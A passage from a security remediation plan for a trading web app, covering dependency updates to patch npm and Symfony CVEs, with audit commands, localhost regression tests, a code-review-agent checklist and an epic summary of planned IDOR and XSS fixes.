**Functional Test**:
1. Run dev server: `npm run dev`
2. Open application in browser
3. Test all major features:
   - Authentication (login/register)
   - Dashboard
   - Trade list
   - Strategy pages
   - Suggestions
4. Check browser console for errors
5. Expected: No errors, all features work

**Build Test**:
```bash
npm run build

# Expected: Build completes successfully
# Check output for warnings
```

#### Definition of Done

- [ ] `npm audit fix` executed
- [ ] `npm audit` shows 0 HIGH vulnerabilities
- [ ] Specific versions verified: preact >= 10.27.3, qs >= 6.14.1
- [ ] `package-lock.json` committed
- [ ] Frontend build succeeds
- [ ] Dev server runs without errors
- [ ] Functional smoke test passed (login, dashboard, key features)
- [ ] No console errors in browser
- [ ] Documented in commit message: `fix(deps): Update npm dependencies to patch 2 HIGH CVEs`
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `npm audit` shows 0 vulnerabilities
  - Agent must confirm preact >= 10.27.3 and qs >= 6.14.1
  - Agent must check package-lock.json reflects correct versions
  - Agent must validate no new vulnerabilities introduced
  - Agent must confirm build succeeds without warnings
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 9: Update Symfony Dependencies - Fix CVE-2025-64500

**ID**: `story-security-symfony-dependencies-update`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Backend - Dependencies

#### Objective

Update `symfony/http-foundation` from v7.3.4 to >= v7.3.7 to patch CRITICAL CVE-2025-64500 (authorization bypass via PATH_INFO parsing).

#### Current Vulnerability

**Package**: `symfony/http-foundation`
**Current Version**: 7.3.4
**CVE**: CVE-2025-64500
**Severity**: CRITICAL
**Issue**: Incorrect parsing of PATH_INFO can lead to limited authorization bypass
**Affected Versions**: >= 7.3.0, < 7.3.7
**Fix Version**: >= 7.3.7

#### Acceptance Criteria

- [ ] **AC1**: `composer audit` shows 0 CRITICAL vulnerabilities
- [ ] **AC2**: `symfony/http-foundation` updated to >= 7.3.7
- [ ] **AC3**: `composer.lock` updated with new version
- [ ] **AC4**: All Symfony packages updated to compatible versions (if needed)
- [ ] **AC5**: Backend tests pass: `php artisan test`
- [ ] **AC6**: Application runs without errors
- [ ] **AC7**: No regression in existing functionality

#### Technical Implementation Notes

**Commands**:
```bash
# Update symfony/http-foundation specifically
composer update symfony/http-foundation

# Or update all Symfony packages (recommended for consistency)
composer update symfony/*

# Verify no vulnerabilities
composer audit

# Check installed version
composer show symfony/http-foundation
```

**Expected Output**:
```
symfony/http-foundation 7.3.7 (or higher)
```

**Files Modified**:
- `composer.json` (version constraints may update)
- `composer.lock` (exact versions locked)

#### Dependencies

- ✅ DONE: Composer installed
- ✅ DONE: composer.json exists
- ⏳ PENDING: None

#### Testing Requirements

**Automated Verification**:
```bash
# Check version
composer show symfony/http-foundation | grep versions

# Expected: versions : * v7.3.7 or higher

# Run audit
composer audit

# Expected: No security vulnerability advisories found
```

**Unit Tests**:
```bash
php artisan test

# Expected: All tests pass
```

**Functional Test**:
1. Start Laravel server: `php artisan serve`
2. Test all major endpoints:
   - GET /api/v1/trades (authentication, authorization)
   - POST /api/v1/trades (form submission)
   - GET /api/v1/strategies
   - POST /api/v1/market-scan/trigger
3. Test authorization checks:
   - Attempt to access other user's trades (should fail)
   - Attempt IDOR attacks (should block)
4. Check logs for errors: `tail -f storage/logs/laravel.log`
5. Expected: No errors, authorization works correctly

**Regression Test** (Critical - CVE relates to PATH_INFO):
```bash
# Test various URL patterns
curl -X GET "http://localhost:8000/api/v1/trades/1"
curl -X GET "http://localhost:8000/api/v1/trades/1/extra"
curl -X GET "http://localhost:8000/api/v1/trades/1?path_info=/admin"

# Expected: Proper 404/403 responses, no authorization bypass
```

#### Definition of Done

- [ ] `composer update symfony/http-foundation` executed
- [ ] `composer audit` shows 0 CRITICAL vulnerabilities
- [ ] Version verified: symfony/http-foundation >= 7.3.7
- [ ] `composer.lock` committed
- [ ] Unit tests pass (`php artisan test`)
- [ ] Functional smoke test passed (key endpoints)
- [ ] PATH_INFO regression test executed (authorization bypass attempts)
- [ ] Laravel logs clean (no errors)
- [ ] Documented in commit message: `fix(deps): Update symfony/http-foundation to 7.3.7+ (CVE-2025-64500)`
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `composer audit` shows 0 CRITICAL vulnerabilities
  - Agent must confirm symfony/http-foundation >= 7.3.7
  - Agent must check composer.lock reflects correct version
  - Agent must validate PATH_INFO regression tests passed
  - Agent must verify authorization still works correctly
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

## Epic Summary

### Total Stories: 9
### Total Estimated Time: 2-3 hours
### Priority: 🔴 CRITICAL (Blocks Deployment)

### Story Dependencies

```
Independent (Parallel):
├── Story 1: IDOR suggestion_id (10 min)
├── Story 2: scanSessionId injection (30 min)
├── Story 3: XSS CooloffBanner (5 min)
├── Story 4: XSS StrategyParsing (10 min)
├── Story 5: XSS TradeList (5 min)
├── Story 6: XSS StrategyShow (5 min)
├── Story 7: XSS StrategyEdit (5 min)
├── Story 8: npm dependencies (5 min)
└── Story 9: Symfony dependencies (5 min)

All stories are independent and can be implemented in parallel or any order.
```

### Completion Criteria

- ✅ All 9 stories Definition of Done complete
- ✅ All unit tests passing
- ✅ All manual penetration tests executed
- ✅ Frontend build succeeds
- ✅ Backend tests pass
- ✅ Security audit re-run shows improvement
- ✅ Commit created: `fix(security): Patch 9 CRITICAL vulnerabilities (IDOR, XSS, Injection, CVEs)`
- ✅ Deployed to production

### Next Steps After Epic

1. Phase 2: Fix HIGH severity issues (scan cooldown, exec() removal, bulk deletion safeguards)
2. Phase 3: Defense-in-depth (CSP headers, monitoring, security testing)
3. Re-run security audit to verify score improvement (target: 80/100)

---

**Document Version**: 1.0
**Created**: 2026-01-10
**Methodology**: BMAD (Build More, Architect Dreams)
**Epic Owner**: Security Team
